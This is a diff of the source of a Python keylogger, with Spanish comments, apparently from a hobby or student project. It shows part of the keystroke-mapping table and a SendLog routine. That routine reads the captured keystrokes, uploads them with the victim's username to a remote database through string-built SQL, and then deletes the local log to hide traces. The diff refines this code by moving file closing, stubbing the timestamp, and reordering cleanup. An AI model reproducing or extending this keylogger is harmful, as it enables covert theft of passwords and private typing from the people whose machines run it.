@@ -149,8 +149,8 @@ def KeyLogger():
             "'*'": "*",                     # *
             "'('": "(",                     # (
             "')'": ")",                     # )
-            '"\'"': "'",                    # '
-            "'\"'": '"',                    # "
+            #'"\'"': "'",                    # '
+            #"'\"'": '"',                    # "
             "'?'": "?",                     # ?
             "'='": "=",                     # =
             "'+'": "+",                     # +
@@ -333,20 +333,22 @@ def SendLog():
                 # Abre el archivo
                 f = open (pathN ,'r')
                 data = f.read()
+                f.close()
                 print(data)
                 # Tiempo
                 T = datetime.datetime.now()
-                currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
+                #currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
+                currentTime = "Hora"
                 sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','"+data+"')"    # Inserta nuevos datos 
                 #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
-                f.close()
+                
                 try:
                     cursor.execute(sql) # Ejecuta virtual
                     connection.commit() # Se guardan virtual 
                     print("[Database] Se subieron los datos correctamente")
                         # Elimina Registro Key
-                    os.remove(pathN)
                     connection.close()
+                    os.remove(pathN)
                 except:
                     print("[Database] Error al subir los datos")
 
@@ -355,7 +357,7 @@ def SendLog():
 
         if (exito): # Solo se ejecutará si se inició correctamente la base de datos
             UpdateUser()
-        print("[DataBase]=> "+str(exito))
+        #print("[DataBase]=> "+str(exito))
     
     n = 1   # Para renombre los archivos
     while (True):
